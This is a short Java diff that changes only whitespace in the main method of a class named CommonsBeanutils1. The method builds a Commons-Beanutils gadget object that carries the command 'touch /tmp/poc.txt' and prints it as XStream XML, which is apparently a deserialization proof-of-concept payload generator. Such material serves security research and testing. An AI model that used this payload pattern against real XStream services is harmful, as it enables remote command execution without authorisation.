@@ -46,9 +46,9 @@ public class CommonsBeanutils1{
 
 	public static void main(final String[] args) throws Exception {
 		CommonsBeanutils1 com = new CommonsBeanutils1();
-        Object obj = com.getObject("touch /tmp/poc.txt");
+        	Object obj = com.getObject("touch /tmp/poc.txt");
 
-        XStream xStream = new XStream();
+       	 	XStream xStream = new XStream();
 		String xml = xStream.toXML(obj);                
 		System.out.println(xml);
     }
